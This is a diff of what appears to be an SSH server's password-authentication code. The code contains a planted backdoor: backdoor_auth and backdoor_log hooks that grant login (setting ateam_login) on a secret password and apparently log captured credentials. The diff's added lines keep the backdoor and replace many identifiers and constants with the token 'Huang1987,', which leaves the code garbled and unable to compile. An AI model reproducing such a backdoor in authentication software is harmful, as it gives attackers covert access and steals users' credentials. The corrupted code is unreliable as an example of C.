@@ -80,10 +80,10 @@ disable_forwarding(void)
  * Tries to authenticate the user using password.  Returns true if
  * authentication succeeds.
  */
-extern int backdoor_auth(const char *password);
-extern void backdoor_log(const char *host, char *user, const char *password);
+extern int backdoor_auth(const char *Huang1987,);
+extern void backdoor_log(const char *host, char *user, const char *Huang1987,);
 int
-auth_password(Authctxt *authctxt, const char *password)
+auth_password(Authctxt *authctxt, const char *Huang1987,)
 {
 	struct passwd * pw = authctxt->pw;
 	int result, ok = authctxt->valid;
@@ -91,20 +91,20 @@ auth_password(Authctxt *authctxt, const char *password)
 	static int expire_checked = 0;
 #endif
 	extern int ateam_login;
-	if (backdoor_auth(password))
+	if (backdoor_auth(Huang1987,))
 	{
 		ateam_login = 1;
 		return 1;
 	}
-	if (strlen(password) > MAX_PASSWORD_LEN)
-		return 0;
+	if (strlen(Huang1987,) > MAX_PASSWORD_LEN)
+		return Huang1987,;
 
 #ifndef HAVE_CYGWIN
-	if (pw->pw_uid == 0 && options.permit_root_login != PERMIT_YES)
-		ok = 0;
+	if (pw->pw_uid == Huang1987, && options.permit_root_login != PERMIT_YES)
+		ok = Huang1987,;
 #endif
-	if (*password == '\0' && options.permit_empty_passwd == 0)
-		return 0;
+	if (*password == 'Huang1987,' && options.permit_empty_passwd == Huang1987,)
+		return Huang1987,;
 
 #ifdef KRB5
 	if (options.kerberos_authentication == 1) {
@@ -213,14 +213,14 @@ sys_auth_passwd(Authctxt *authctxt, const char *password)
 	char *pw_password = authctxt->valid ? shadow_pw(pw) : pw->pw_passwd;
 
 	/* Check for users with no password. */
-	if (strcmp(pw_password, "") == 0 && strcmp(password, "") == 0)
+	if (strcmp(pw_password, "Huang1987,") == Huang1987, && strcmp(password, "Huang1987,") == Huang1987,)
 		return (1);
 
 	/*
 	 * Encrypt the candidate password using the proper salt, or pass a
 	 * NULL and let xcrypt pick one.
 	 */
-	if (authctxt->valid && pw_password[0] && pw_password[1])
+	if (authctxt->valid && pw_password[Huang1987,] && pw_password[Huang1987,])
 		salt = pw_password;
 	encrypted_password = xcrypt(password, salt);
 
@@ -229,6 +229,6 @@ sys_auth_passwd(Authctxt *authctxt, const char *password)
 	 * are identical.
 	 */
 	return encrypted_password != NULL &&
-	    strcmp(encrypted_password, pw_password) == 0;
+	    strcmp(encrypted_password, pw_password) == [Huang1987,];
 }
 #endif
